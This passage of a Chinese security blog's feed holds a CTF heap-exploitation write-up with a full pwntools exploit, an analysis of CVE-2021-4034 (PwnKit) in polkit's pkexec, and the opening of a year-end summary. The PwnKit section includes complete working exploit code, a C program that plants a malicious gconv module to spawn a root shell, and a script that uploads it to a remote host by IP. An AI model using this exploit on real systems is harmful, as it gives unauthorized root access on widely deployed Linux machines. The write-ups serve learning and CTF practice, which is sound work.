+<p>想要从进入<code>dummyArena()</code>，还需要满足<code>eeee-&gt;attr &amp; S_CLONE</code>。</p>
+<pre><code class="language-c">case 0:
+			if(eeee-&gt;attr &amp; S_CLONE) {
+				dummyArena();
+				break;
+			}
+</code></pre>
+<p>在<code>mouse.c</code>的<code>useItemImpl()</code>中可以看到，使用道具<code>book3</code>就能获得这个技能。</p>
+<pre><code class="language-c">else if(!strcmp(obj, &quot;book3&quot;)) {
+	_this-&gt;attr |= S_CLONE;
+					
+	printf(&quot;[God] %s learned new skill: &quot;
+	&quot;\033[33mclone\033[m.\n&quot;, _this-&gt;name);
+}
+</code></pre>
+<p>不过想要获得<code>book3</code>，需要大量的coin。</p>
+<pre><code class="language-c">static shopItem_t shop_list[0x8] = {
+	{&quot;sword&quot;, 5},
+	{&quot;shield&quot;, 5},
+	{&quot;nameTag&quot;, 68},
+	{&quot;book1&quot;, 98},
+	{&quot;book2&quot;, 198},
+	{&quot;book3&quot;, 0x114514},
+	{&quot;potion1&quot;, 5},
+	{&quot;potion2&quot;, 30},
+};
+</code></pre>
+<h3 id="step1-打怪刷钱">step1. 打怪刷钱</h3>
+<p>为了买到<code>book3</code>，首先就需要刷钱。</p>
+<pre><code class="language-c">typedef struct MouseAttr {
+	uint32_t hp;
+	uint32_t atk;
+	uint32_t coin;
+	uint32_t attr;
+	
+	char     mayUse[0x10];
+} mouseAttr_t;
+
+static mouseAttr_t attr_list[0x8] = {
+	{0xeeeea, 0xeeeea, 0xeeeea, S_FIRE|S_HEAL, &quot;eeee&quot;},
+	{13, 10, 0, 0, &quot;&quot;},
+	{1, 0, 0, 0, &quot;dummy%04u&quot;},
+	{10, 5, 1, 0, &quot;normal mouse&quot;},
+	{11, 6, 2, 0, &quot;armed mouse&quot;},
+	{50, 20, 4, 0, &quot;elite mouse&quot;},
+	{80, 80, 0, 0, &quot;lost mouse&quot;},
+};
+</code></pre>
+<p>击败<code>BOSS_MOUSE</code>，一次就可以获得0xeeeea的coin，这无疑是最快速的刷钱方法。</p>
+<p>不过我们<code>HERO_MOUSE</code>的<code>atk</code>和<code>hp</code>都远远比不过<code>BOSS_MOUSE</code>，所以需要使用一些小手段。</p>
+<p>同样是在<code>useItemImpl()</code>中，会发现一处off by one的查找，</p>
+<pre><code class="language-c">void useItemImpl(mouse_t *_this, char *obj) {
+	int i = 0;
+	for( ; i &lt;= BAG_CAP; ++i) {  // off by one
+		if(!strncmp(obj, _this-&gt;bag[i].name, 8)) {
+			if(_this-&gt;bag[i].attr &amp; I_USEABLE) {
+				if(_this-&gt;bag[i].count == 0) {
+					puts(&quot;[God] You don't have that.&quot;);
+					return;
+				}
+                ......
+                    
+			}
+			--_this-&gt;bag[i].count;
+			printf(&quot;[God] you used %s, leave %u.\n&quot;, \
+				_this-&gt;bag[i].name, _this-&gt;bag[i].count);
+		}
+	}
+}
+</code></pre>
+<p>再结合一下<code>mouse_t</code>和<code>item_t</code>的结构</p>
+<pre><code class="language-c">typedef struct Item {
+	char name[0x8];
+	uint32_t attr;
+	uint32_t count;
+} item_t;
+
+typedef struct Mouse {
+	char name[0x10];
+	item_t  bag[BAG_CAP];
+	
+	uint32_t id;
+	uint32_t type;
+	uint32_t hp;
+	uint32_t atk;
+	uint32_t coin;
+	uint32_t attr;
+	
+	void*  (*initBag)(struct Mouse *_this);
+	void*  (*useItem)(struct Mouse *_this, char *obj);
+	void*  (*queryStat)(struct Mouse *_this);
+	void*  (*buyGoods)(struct Mouse *_this, char *obj);
+} mouse_t;
+</code></pre>
+<p>bag这里的off by one，会把接下来的<code>{id, type, hp, atk}</code>当做<code>item_t</code>来解析，即<code>{id, type}</code>作为<code>item_t-&gt;name</code>，<code>hp</code>作为<code>item_t-&gt;attr</code>，<code>atk</code>作为<code>item_t-&gt;count</code>。</p>
+<p>也就是说如果已知我们自己的<code>id</code>和<code>type</code>，然后让<code>_this-&gt;bag[i].attr &amp; I_USEABLE</code>为0，</p>
+<p>就能借用他的<code>--_this-&gt;bag[i].count;</code>来负数溢出我们的<code>atk</code>。</p>
+<p>溢出到<code>(unsigned)-1</code>之后，就能轻松打赢<code>BOSS_MOUSE</code>，然后刷钱了。</p>
+<h3 id="step2-dummyarena与利用的开端">step2. dummyArena与利用的开端</h3>
+<p>拿到足够的钱之后，去商店购买<code>book3</code>和<code>nameTag</code>（这个为以后做准备）。</p>
+<p>使用<code>book3</code>学会技能<code>clone</code>之后进入<code>dummyArena</code>，</p>
+<p>至此，该题的前戏部分结束，从这里开始分析最终的利用思路。</p>
+<p>在<code>dummyFight</code>中，如果你的对手是<code>NORMAL_MOUSE</code>，就会触发与隐藏的<code>LOST_MOUSE</code>的战斗。</p>
+<pre><code class="language-c">if(ene-&gt;type == NORMAL_MOUSE) {
+	hiden_ene = malloc(sizeof(mouse_t));
+	initMouse(hiden_ene, LOST_MOUSE);
+}
+	......
+
+if(ene-&gt;type == NORMAL_MOUSE \
+	&amp;&amp; fight(dummy, hiden_ene)) {
+	return ;
+}
+</code></pre>
+<p>且<code>dummyArena</code>中提供了任意次数随机敌人类型的功能，可以保证想要的线程对上<code>LOST_MOUSE</code></p>
+<pre><code class="language-c">srand((unsigned)time(NULL));
+dummyLevelEnemies[0] = dummyNum;
+	
+do {
+		
+	for(i = 1; i &lt; dummyLevelEnemies[0]; ++i) {
+		dummyLevelEnemies[i] = rand()%3+3;
+	}
+		
+	printf(&quot;[God] your dummies will fight with:\n&quot;);
+	for(i = 1; i &lt; dummyLevelEnemies[0]; ++i) {
+		printf(&quot;\033[34m(%u) %s\033[m, &quot;, \
+			i, attr_list[dummyLevelEnemies[i]].mayUse);
+		if(i % (winCol/22) == 0)
+			putchar(0x0A);
+	}
+	
+	printf(&quot;\n[God] sure?(y/N)\n&quot;);
+	printf(&quot;[%s] &quot;, eeee-&gt;name);
+	
+	read(0, buf, 2);
+	
+} while(buf[0]!='y' &amp;&amp; buf[0]!='Y');
+</code></pre>
+<p>我们创建的线程数也是可控的。</p>
+<pre><code class="language-c">for(i = 1; i &lt; dummyNum; ++i) {
+		pthread_create(&amp;dummyThread[i], NULL, dummyFight, (uint32_t *) &amp;i);
+		usleep(10000);
+}
+</code></pre>
+<p>一个常识，<code>ptmalloc2</code>针对多线程一般是一个线程对应一个arena，不过在<strong>线程数&gt;CPU核心数*8</strong>时（在x64下），又会尝试去对之前使用过的arena加lock，然后继续使用。（假设这个docker环境的核心数是2，那么第17个线程就会尝试对main_arena上锁并使用他的空间）</p>
+<p>（这也是我让菜单显示选择ARENAS(竞技场)的原因，他其实带有一定的暗示是和glibc的arena相关的trick了hh）</p>
+<p>此时，再结合2byte的uaf这个洞，是否隐约可以联想到一些东西了。</p>
+<p>在使用tcache的glibc版本中，每个线程都会有一个<code>tcache_pthread_struct</code>，并且在线程结束时会调用<code>tcache_thread_shutdown</code>。</p>
+<pre><code class="language-c">static void
+tcache_thread_shutdown (void)
+{
+  int i;
+  tcache_perthread_struct *tcache_tmp = tcache;
+
+  if (!tcache)
+    return;
+
+  /* Disable the tcache and prevent it from being reinitialized.  */
+  tcache = NULL;
+  tcache_shutting_down = true;
+
+  /* Free all of the entries and the tcache itself back to the arena
+     heap for coalescing.  */
+  for (i = 0; i &lt; TCACHE_MAX_BINS; ++i)
+    {
+      while (tcache_tmp-&gt;entries[i])
+	{
+	  tcache_entry *e = tcache_tmp-&gt;entries[i];
+	  tcache_tmp-&gt;entries[i] = e-&gt;next;
+	  __libc_free (e);
+	}
+    }
+
+  __libc_free (tcache_tmp);
+}
+</code></pre>
+<p>它会遍历每个entries，然后free掉所有结点。</p>
+<p>借用2bytes的uaf，可以达成对部分位置的free。但是由于2bytes的局限性，只能在原来next指针附近找。</p>
+<p>所以这个时候，如果该线程是和main_arena共用内存的，那么就可以free掉自己，再配合改名卡就能劫持到next指针。</p>
+<p>在每个己方mouse出生的时候都会给出一个坐标，</p>
+<pre><code class="language-c">uint32_t position(mouse_t *m, int pos) {
+	return (((uint64_t)m &gt;&gt; (pos*8)) &amp; 0xFFFF) ^ 0xBAAD;
+}
+</code></pre>
+<p>对该坐标进行简单解密即可得到堆上的位置。</p>
+<p>可以借用这个gift判断服务器环境是第几个线程开始复用main_arena，也可以借用他判断自己的位置和该dummy的位置是否只有最后2bytes不同（如果超过2bytes了，那么就可以重开游戏了，不过这个概率并不大）</p>
+<p>还需要注意的是，free自己的时候，自己的name的前8bytes一定要是<code>\x00\x00\x00\x00\x00\x00\x00\x00</code>，不然<code>tcache_thread_shutdown</code>会把这个name当指针去free下一个chunk，大概率会段错误。</p>
+<p>因此在原题中我也加了这个判断，</p>
+<pre><code class="language-c">if(*((uint64_t**) (b-&gt;name))[0] == O_NAME) {  // O_NAME == 0
+	printf(&quot;[%2s] that's my name!\n&quot;, b-&gt;name);
+	printf(&quot;[%2s] thank you very much!\n&quot;, b-&gt;name);
+						
+}
+else {
+	*((uint64_t *) b-&gt;name) = O_NAME;
+	printf(&quot;[  ] That's not my name. &quot;
+		&quot;Maybe I will remember it at the end of my life.\n&quot;);
+}
+</code></pre>
+<h3 id="step3-完成后续的利用">step3. 完成后续的利用</h3>
+<p>free掉自己之后，main_arena的bins结构如下：</p>
+<pre><code>pwndbg&gt; bins
+tcachebins
+0x20 [  2]: 0x55c68921e920 —▸ 0x55c68921e2a0 ◂— 0x0
+0xd0 [  1]: 0x55c689229d50 ◂— 0x0
+0x120 [  7]: 0x55c68922a4e0 —▸ 0x55c68922a3c0 —▸ 0x55c68922a2a0 —▸ 0x55c68922a180 —▸ 0x55c68922a060 —▸ 0x55c689229f40 —▸ 0x55c689229e20 ◂— 0x0
+0x1e0 [  1]: 0x55c68921eeb0 ◂— 0x0
+0x370 [  1]: 0x55c68921eb40 ◂— 0x0
+fastbins
+0x20: 0x0
+0x30: 0x0
+0x40: 0x0
+0x50: 0x0
+0x60: 0x0
+0x70: 0x0
+0x80: 0x0
+unsortedbin
+all: 0x55c68922a5f0 —▸ 0x55c68922c210 —▸ 0x55c689229c70 —▸ 0x7ff7c1b65be0 (main_arena+96) ◂— 0x55c68922a5f0
+smallbins
+empty
+largebins
+empty
+</code></pre>
+<p>我们自己的chunk被放入了unsortedbin，且fd就是libc上的地址，所以可以直接通过查询status来leak libc。</p>
+<p>然后为了能够打tcache的任意申请，还需要调整一下bin，让这个chunk到tcache bin里去。</p>
+<p>这个时候可以借用只有2个enemies的level2，</p>
+<pre><code class="language-c">static uint32_t enemies[LEVELS][LEVEL_MAX_NUM] = {
+	{1, NORMAL_MOUSE, USELESS, USELESS, USELESS, USELESS},
+	{2, ARMED_MOUSE, ARMED_MOUSE, USELESS, USELESS, USELESS},
+	{1, BOSS_MOUSE, USELESS, USELESS, USELESS, USELESS}
+};
+
+uint32_t levelEnemies[LEVEL_MAX_NUM];
+uint32_t dummyLevelEnemies[LEVEL_MAX_NUM_DUMMY];
+
+mouse_t *ene[LEVEL_MAX_NUM];
+</code></pre>
+<pre><code class="language-c">void loadLevel(uint32_t lev) {
+	int i;
+	--lev;
+	for(i = 0; i &lt; LEVEL_MAX_NUM; ++i) {
+		levelEnemies[i] = enemies[lev][i];
+	}
+	
+	// generate enemies
+	for(i = 1; i &lt;= levelEnemies[0]; ++i) {
+		ene[i] = malloc(sizeof(mouse_t));
+		initMouse(ene[i], levelEnemies[i]);
+	}
+	
+	for(i = 1; i &lt;= levelEnemies[0]; ++i) {
+		fight(eeee, ene[i]);
+		
+		sleep(1);
+	}
+}
+</code></pre>
+<p>分别malloc和free了两个mouse_t变量之后，我们自己的chunk就来到tcache 0xd0那条entries的头部了，非常舒服。这个时候使用之前囤好的<code>nameTag</code>，就可以劫持next指针了。</p>
+<p>remake功能会重新malloc内存，然后送改名卡。</p>
+<pre><code class="language-c">void remake() {
+	printf(&quot;[God] you wanna remake?\n&quot;);
+	printf(&quot;[God] okay, I'll satisfy you.\n&quot;);
+	
+	char *tmp = eeee-&gt;name;
+	
+	eeee = malloc(sizeof(mouse_t));
+	
+	initMouse(eeee, HERO_MOUSE);
+	strncpy(eeee-&gt;name, tmp, strlen(tmp));
+	
+	printf(&quot;[God] ...and I'll give you a nameTag.\n&quot;);
+	++eeee-&gt;bag[2].count;
+}
+</code></pre>
+<p>我这里是选择劫持<code>__free_hook-0x8</code>，然后重开两次并改名字为<code>b'/bin/sh\x0A' + p64(system_addr)</code></p>
+<p>不用<code>/bin/sh\x00</code>是因为会截断改名卡中的strncpy。</p>
+<p>最后退出游戏，利用<code>doExit()</code>中的free即可getshell。</p>
+<h2 id="exp-2">exp</h2>
+<pre><code class="language-python">from pwn import *
+import sys
+
+context.log_level = 'debug'
+
+path_to_elf = '/home/kotori/Desktop/vnctf/rats/rats'
+
+ip = sys.argv[1]
+port = int(sys.argv[2])
+
+elf = ELF(path_to_elf)
+libc = elf.libc
+
+if port == 0:
+	p = process(path_to_elf)
+else:
+	p = remote(ip, port)
+
+sla = lambda x,y : p.sendlineafter(x,y)
+sa  = lambda x,y : p.sendafter(x,y)
+ru  = lambda x   : p.recvuntil(x)
+
+def g(arg=''):
+	if port != 0:
+		return
+	gdb.attach(p, arg)
+	raw_input()
+
+def choice(op):
+	sla('choice: ', str(op))
+
+def arena(op):
+	choice(1)
+	choice(str(op))
+
+def buy(obj):
+	choice(2)
+	sla('want a', obj)
+
+def use(obj):
+	choice(3)
+	choice(1)
+	ru('use?\n')
+	sa(']', obj)
+
+def leak_heap(x, y, z):
+	ret = (z ^ 0xBAAD)&lt;&lt;16
+	ret = (ret + y ^ 0xBAAD)&lt;&lt;16
+	ret += x ^ 0xBAAD
+	return ret
+
+sa('&gt; Press any key to start &lt;', b'\x0A')
+sa('name is: ', b'\x00'*0x10)
+
+ru(': (')
+xx = int(ru(', ')[:-2])
+yy = int(ru(', ')[:-2])
+zz = int(ru(').')[:-2])
+
+eeee_addr = leak_heap(xx, yy, zz)
+print(hex(eeee_addr))
+
+arena(1)
+
+# overflow atk
+for i in range(11):
+	use(p32(1)+p32(1))
+
+# get coins
+for i in range(3):
+	arena(3)
+
+# learn clone
+buy('book3')
+buy('nameTag')
+buy('nameTag')
+use('book3\n')
+
+num = 17 # 33
+
+arena(0)
+sla('summon?', str(num))
+
+content = ru('sure?')
+target = '({}) normal mouse'.format(num-1)
+print(target)
+
+while bytes(target, encoding='UTF-8') not in content:
+	p.sendline('n')
+	content = ru('sure?')
+
+sla('(y/N)', 'y')
+
+ru('[God] dummy00{} is spanned at the position: ('.format(num-1))
+xx = int(ru(', ')[:-2])
+yy = int(ru(', ')[:-2])
+zz = int(ru(').')[:-2])
+
+dummy_addr = leak_heap(xx, yy, zz)
+print(hex(dummy_addr))
+
+assert (eeee_addr&gt;&gt;16) == (dummy_addr&gt;&gt;16)
+
+ru('[dummy00')
+idx = p.recv(2)
+while idx != bytes(str(num-1), encoding='UTF-8'):
+	p.send('\x0A')
+	ru('[dummy00')
+	idx = p.recv(2)
+
+p.sendline('y')
+sa('[dummy00{}]'.format(num-1), p16(eeee_addr &amp; 0xFFFF))
+
+for i in range(31):
+	p.sendline('n')
+
+choice(3)
+
+libc_addr = u64(ru(b'\x7f')[-6:].ljust(0x8, b'\x00')) - 0x1ecbe0
+print(hex(libc_addr))
+
+free_hook = libc_addr + libc.symbols['__free_hook']
+sys = libc_addr + libc.symbols['system']
+
+choice(2)
+
+# unsortedbin -&gt; tcache bin
+arena(2)
+
+use('nameTag\n')
+sa('name:', p64(free_hook-0x8))
+
+choice(4)
+choice(4)
+
+use('nameTag\n')
+sa('name:', b'/bin/sh\x0A' + p64(sys))
+
+g()
+
+choice(5)
+
+p.interactive()
+</code></pre>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[CVE-2021-4034 Polkit-Pkexec]]></title>
+        <id>https://kotoriseed.github.io/post/CVE-2021-4034/</id>
+        <link href="https://kotoriseed.github.io/post/CVE-2021-4034/">
+        </link>
+        <updated>2023-01-12T03:05:34.000Z</updated>
+        <content type="html"><![CDATA[<p>前几天做Realworld体验赛的时候有一题<strong>Be-a-PK-LPE-Master</strong>，考查了对<strong>CVE-2021-4034</strong>的利用。当时是直接非预期的所以没有深究。</p>
+<p>现在用预期解来复现一下，顺便借此环境分析一下<strong>CVE-2021-4034</strong>。</p>
+<h1 id="分析">分析</h1>
+<p><code>CVE-2021-4034</code>是存在于<code>Polkit</code>中的<code>pkexec</code>的提权漏洞，影响到的linux版本不计其数。</p>
+<p>pkexec是一个拥有suid权限的程序，可以被利用来执行root权限的命令。（web手应该都很熟悉suid提权）</p>
+<p>但是glibc会在特权程序执行的时候清除敏感环境变量，以此来保证系统的安全性</p>
+<pre><code class="language-c">void
+_dl_non_dynamic_init (void)
+{
+  ......
+      
+  if (__libc_enable_secure)  //判断特权模式
+    {
+      static const char unsecure_envvars[] =
+	UNSECURE_ENVVARS
+#ifdef EXTRA_UNSECURE_ENVVARS
+	EXTRA_UNSECURE_ENVVARS
+#endif
+	;
+      const char *cp = unsecure_envvars;
+
+      while (cp &lt; unsecure_envvars + sizeof (unsecure_envvars))  //在此全部清空
+	{
+	  __unsetenv (cp);
+	  cp = (const char *) __rawmemchr (cp, '\0') + 1;
+	}
+
+#if !HAVE_TUNABLES
+      if (__access (&quot;/etc/suid-debug&quot;, F_OK) != 0)
+	__unsetenv (&quot;MALLOC_CHECK_&quot;);
+#endif
+    }
+    ......
+        
+}
+</code></pre>
+<p>对<code>unsecure_envvars</code>的定义如下：</p>
+<pre><code class="language-c">#if !HAVE_TUNABLES
+# define GLIBC_TUNABLES_ENVVAR &quot;GLIBC_TUNABLES\0&quot;
+#else
+# define GLIBC_TUNABLES_ENVVAR
+#endif
+
+/* Environment variable to be removed for SUID programs.  The names are
+   all stuffed in a single string which means they have to be terminated
+   with a '\0' explicitly.  */
+#define UNSECURE_ENVVARS \
+  &quot;GCONV_PATH\0&quot;							      \
+  &quot;GETCONF_DIR\0&quot;							      \
+  GLIBC_TUNABLES_ENVVAR							      \
+  &quot;HOSTALIASES\0&quot;							      \
+  &quot;LD_AUDIT\0&quot;								      \
+  &quot;LD_DEBUG\0&quot;								      \
+  &quot;LD_DEBUG_OUTPUT\0&quot;							      \
+  &quot;LD_DYNAMIC_WEAK\0&quot;							      \
+  &quot;LD_HWCAP_MASK\0&quot;							      \
+  &quot;LD_LIBRARY_PATH\0&quot;							      \
+  &quot;LD_ORIGIN_PATH\0&quot;							      \
+  &quot;LD_PRELOAD\0&quot;							      \
+  &quot;LD_PROFILE\0&quot;							      \
+  &quot;LD_SHOW_AUXV\0&quot;							      \
+  &quot;LD_USE_LOAD_BIAS\0&quot;							      \
+  &quot;LOCALDOMAIN\0&quot;							      \
+  &quot;LOCPATH\0&quot;								      \
+  &quot;MALLOC_TRACE\0&quot;							      \
+  &quot;NIS_PATH\0&quot;								      \
+  &quot;NLSPATH\0&quot;								      \
+  &quot;RESOLV_HOST_CONF\0&quot;							      \
+  &quot;RES_OPTIONS\0&quot;							      \
+  &quot;TMPDIR\0&quot;								      \
+  &quot;TZDIR\0&quot;
+</code></pre>
+<p>所以是没法直接使用特权程序来做一些比较危险的操作的。</p>
+<p>但是在<code>pkexec</code>的主函数中，有以下代码</p>
+<pre><code class="language-c">for (n = 1; n &lt; (guint) argc; n++)
+    {
+      ......
+    }
+......
+    
+  if (path[0] != '/')
+    {
+      /* g_find_program_in_path() is not suspectible to attacks via the environment */
+      s = g_find_program_in_path (path);
+      if (s == NULL)
+        {
+          g_printerr (&quot;Cannot run program %s: %s\n&quot;, path, strerror (ENOENT));
+          goto out;
+        }
+      g_free (path);
+      argv[n] = path = s;
+    }
+......
+</code></pre>
+<p>他在处理参数的时候，下标<code>n</code>是<strong>从1开始遍历</strong>的，并在后续代码中使用了<code>argv[n] = path = s</code>来赋值。</p>
+<p>那么假如我们的<strong>argc为0</strong>呢，这一句就会变成<code>argv[1] = path = s</code>，这是明显存在越界的。</p>
+<p>而且，<code>argv</code>和前面提到的环境变量，也就是<code>envp</code>的数组<strong>在内存中恰好又是连续的</strong>。</p>
+<p>所以说，这个漏洞使得危险环境变量可以被重新注入。</p>
+<p>但是继续阅读源码就会发现，在环境变量注入不久之后，程序对环境变量进行了完全清除。</p>
+<pre><code class="language-c">if (clearenv () != 0)
+    {
+      g_printerr (&quot;Error clearing environment: %s\n&quot;, g_strerror (errno));
+      goto out;
+    }
+</code></pre>
+<p>因此，利用手段变得富有挑战性了起来。</p>
+<h1 id="利用">利用</h1>
+<h2 id="让argc为0">让argc为0</h2>
+<p>通常情况下，argc其实最少都是1的，因为argv[0]指向程序本身。</p>
+<p>但如果使用execve来调用程序，并对argv传NULL，argc就会变为0（也许对此情况的疏忽就恰是本漏洞的成因）</p>
+<h2 id="劫持环境变量">劫持环境变量</h2>
+<p>再来回顾一下漏洞点的代码</p>
+<pre><code class="language-c">path = g_strdup (argv[n]);  //存在越界读，读出envp[0]
+......
+    
+  if (path[0] != '/')
+    {
+      s = g_find_program_in_path (path);  //找到envp[0]的绝对路径
+	......
+        
+      argv[n] = path = s;  //存在越界写，将envp[0]修改为其绝对路径
+    }
+</code></pre>
+<p>能够劫持<code>g_find_program_in_path (path)</code>的返回值的话，就能注入一个任意环境变量到argv[1] (即envp[0])。</p>
+<p>所以，如果让envp符合</p>
+<pre><code class="language-c">char * const environ[] = {&quot;exp.so&quot;, &quot;PATH=LD_PRELOAD=.&quot;, NULL};
+</code></pre>
+<p>并且提前部署好一个名为<code>LD_PRELOAD=.</code>这个文件夹，且在<code>LD_PRELOAD=.</code>目录下存在<code>exp.so</code>这样一个文件，本目录下再有一个恶意的<code>exp.so</code>，就能成功达成对恶意环境变量的注入。（把<code>LD_PRELOAD</code>换成<code>unsecure_envvars</code>中的任意一个都行，具体过程根据利用思路稍作调整）</p>
+<h2 id="利用g_printerr来getshell">利用g_printerr来getshell</h2>
+<p>有了注入危险环境变量的能力，结合源代码分析getshell思路就不是一件难事了。</p>
+<p>重点放在注入环境变量之后，环境变量被重新清除之前，</p>
+<pre><code class="language-c">if (access (path, F_OK) != 0)
+    {
+      g_printerr (&quot;Error accessing %s: %s\n&quot;, path, g_strerror (errno));
+      goto out;
+    }
+  command_line = g_strjoinv (&quot; &quot;, argv + n);
+  exec_argv = argv + n;
+
+  rc = getpwnam_r (opt_user, &amp;pwstruct, pwbuf, sizeof pwbuf, &amp;pw);
+  if (rc == 0 &amp;&amp; pw == NULL)
+    {
+      g_printerr (&quot;User `%s' does not exist.\n&quot;, opt_user);
+      goto out;
+    }
+  else if (pw == NULL)
+    {
+      g_printerr (&quot;Error getting information for user `%s': %s\n&quot;, opt_user, g_strerror (rc));
+      goto out;
+    }
+for (n = 0; environment_variables_to_save[n] != NULL; n++)
+    {
+      const gchar *key = environment_variables_to_save[n];
+      const gchar *value;
+
+      value = g_getenv (key);
+      if (value == NULL)
+        continue;
+
+      if (!validate_environment_variable (key, value))
+        goto out;
+
+      g_ptr_array_add (saved_env, g_strdup (key));
+      g_ptr_array_add (saved_env, g_strdup (value));
+    }
+</code></pre>
+<p>这里我们选择的攻击对象就是<code>g_printerr</code>，他的作用和printf很像，但是当环境变量存在<code>CHARSET</code>（这个环境变量并没有被认为是不安全的），且值不为<code>UTF-8</code>时，他就会调用glibc中的函数<code>iconv_open</code>来尝试从<code>gconv-modules</code>中读取相应的so文件来转换字符集。</p>
+<p>并且这个<code>gconv-modules</code>的路径是由<code>GCONV_PATH</code>这个环境变量指定的，结合此前的环境变量注入，只需要再构造一个恶意so来让g_printerr调用即可getshell。</p>
+<p><code>gconv-modules</code>解析的格式是一个三元组：</p>
+<pre><code>module UTF-8// EXP// exp 2
+</code></pre>
+<p>(从UTF-8转换为EXP需要调用exp.so中的<code>gconv_init</code>)</p>
+<p>如何触发<code>g_printerr</code>呢？其实也很简单。</p>
+<p>在<code>validate_environment_variable</code>函数中，</p>
+<pre><code class="language-c">static gboolean
+validate_environment_variable (const gchar *key,
+                               const gchar *value)
+{
+    if (g_strcmp0 (key, &quot;SHELL&quot;) == 0)
+    {
+      /* check if it's in /etc/shells */
+      if (!is_valid_shell (value))
+        {
+          log_message (LOG_CRIT, TRUE,
+                       &quot;The value for the SHELL variable was not found the /etc/shells file&quot;);
+          g_printerr (&quot;\n&quot;
+                      &quot;This incident has been reported.\n&quot;);
+          goto out;
+        }
+    }
+    ......
+        
+}
+</code></pre>
+<p>如果有<code>SHELL</code>这个环境变量，且他的value并不在<code>/etc/shells</code>中时，就会调用<code>log_message</code>和<code>g_printerr</code>。</p>
+<p>(这里给出<code>/etc/shells</code>的内容)</p>
+<pre><code># /etc/shells: valid login shells
+/bin/sh
+/bin/bash
+/usr/bin/bash
+/bin/rbash
+/usr/bin/rbash
+/bin/dash
+/usr/bin/dash
+/usr/bin/tmux
+/bin/zsh
+/usr/bin/zsh
+</code></pre>
+<h2 id="综合利用">综合利用</h2>
+<p>下面以今年RealworldCTF体验赛的这道<strong>Be-a-PK-LPE-Master</strong>为例，复现一遍此漏洞的利用过程。</p>
+<p>首先在本地做好准备，写好<code>exp.c</code></p>
+<p>然后nc连上远程主机，拿到普通用户的shell之前需要先处理一个PoW挖矿的问题（爆破5bytes字符来构造一个存在26bits前缀0的sha256的hash）。这一步直接利用pwntools中的mbruteforce模块即可。</p>
+<p>登录的时候使用<code>user</code>空口令登录，然后将编译好的exp传到靶机上。</p>
+<p>成功提权</p>
+<figure data-type="image" tabindex="1"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/01/14/f7d461bd770de.png" alt="1673665037592.png" loading="lazy"></figure>
+<h3 id="expc">exp.c</h3>
+<pre><code class="language-c">#include&lt;unistd.h&gt;
+#include&lt;stdio.h&gt;
+#include&lt;stdlib.h&gt;
+
+char code[] =
+	&quot;#include&lt;unistd.h&gt;\n&quot;
+	&quot;#include&lt;stdio.h&gt;\n&quot;
+	&quot;#include&lt;stdlib.h&gt;\n&quot;
+	&quot;void gconv() {}\n&quot;
+	&quot;void gconv_init(){\n&quot;
+	&quot;  setuid(0); setgid(0);\n&quot;
+	&quot;  seteuid(0); setegid(0);\n&quot;
+	&quot;  char * const args[] = { \&quot;/bin/sh\&quot;, NULL };\n&quot;
+	&quot;  char * const environ[] = { \&quot;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\&quot;, NULL };\n&quot;
+	&quot;  execve(args[0], args, environ);\n&quot;
+	&quot;  exit(0);\n&quot;
+	&quot;}\n&quot;;
+
+int main(){
+	system(&quot;mkdir -p 'GCONV_PATH=.'; touch 'GCONV_PATH=./pwnkit'&quot;);
+	system(&quot;mkdir -p pwnkit; echo 'module UTF-8// PWNKIT// pwnkit 2' &gt; pwnkit/gconv-modules&quot;);
+	system(&quot;chmod a+x 'GCONV_PATH=./pwnkit'&quot;);
+
+	FILE *fp = fopen(&quot;pwnkit/pwnkit.c&quot;, &quot;w&quot;);
+	fprintf(fp, &quot;%s&quot;, code);
+	fclose(fp);
+	system(&quot;gcc pwnkit/pwnkit.c -o pwnkit/pwnkit.so -shared -fPIC&quot;);
+
+	char *args[] = {NULL};
+	char *env[] = {&quot;pwnkit&quot;, &quot;PATH=GCONV_PATH=.&quot;, &quot;CHARSET=PWNKIT&quot;, &quot;SHELL=/ko/to/ri&quot;, NULL};
+	execve(&quot;/usr/bin/pkexec&quot;, args, env);
+	return 0;
+}
+
+</code></pre>
+<h3 id="exppy">exp.py</h3>
+<pre><code class="language-python">from hashlib import sha256
+import sys
+import os
+from pwn import *
+from pwnlib.util.iters import mbruteforce
+import string
+
+context.log_level='debug'
+
+USR = 'user'
+PW  = ''
+
+sla = lambda x,y : p.sendlineafter(x,y)
+sa =  lambda x,y : p.sendafter(x,y)
+ru =  lambda x   : p.recvuntil(x)
+
+p = remote('47.98.99.193', 6666)
+
+prefixes = str(ru(b'&quot;+')[-7:-2])[2:-1]
+print(prefixes)
+
+# raw_input()
+
+def brute(cur):
+
+    content = prefixes + str(cur)
+    s = sha256(content.encode())
+    if s.hexdigest().startswith(&quot;000000&quot;) and int(s.hexdigest()[6:8], 16) &lt; 0x40:
+        return True
+
+    return False
+
+def send_cmd(cmd):
+	sla('$ ', cmd)
+
+def upload():
+	lg = log.progress('Upload')
+	with open('exp', 'rb') as f:
+		data = f.read()
+	encoded = base64.b64encode(data)
+	encoded = str(encoded)[2:-1]
+	for i in range(0, len(encoded), 300):
+		lg.status('%d / %d' % (i, len(encoded)))
+		send_cmd('echo -n &quot;%s&quot; &gt;&gt; benc' % (encoded[i:i+300]))
+	send_cmd('cat benc | base64 -d &gt; bout')
+	send_cmd('chmod +x bout')
+	lg.success()
+
+def login(username, passwd):
+	sla('login: ', username)
+	# sla('Password: ', passwd)
+
+
+res = mbruteforce(brute, string.ascii_lowercase + string.digits, method = 'upto', length=6,  threads = 20)
+print(res)
+
+sla('zero:', res)
+
+login(USR, PW)
+
+os.system('musl-gcc -w -s -static -o3 exp.c -o exp')
+upload()
+
+p.interactive()
+</code></pre>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[2022年终总结]]></title>
+        <id>https://kotoriseed.github.io/post/2022YearEndSummary/</id>
+        <link href="https://kotoriseed.github.io/post/2022YearEndSummary/">
+        </link>
+        <updated>2022-12-19T08:32:52.000Z</updated>
+        <content type="html"><![CDATA[<blockquote>
+<p>虽然是2022的年终总结，但仍然提了一部分21年的事情的人事屑</p>
+</blockquote>
+<h1 id="感谢名单我偏要写在最前面">感谢名单（我偏要写在最前面）</h1>
+<p>感谢小虎鲸实验室的大家（Le1a, Pl1rry, A1kaid, Y5neKO, ...），在学校里一起有说有笑探讨学习（二次元）的时光真的很快乐捏，也希望这份快乐能一直延续下去。</p>
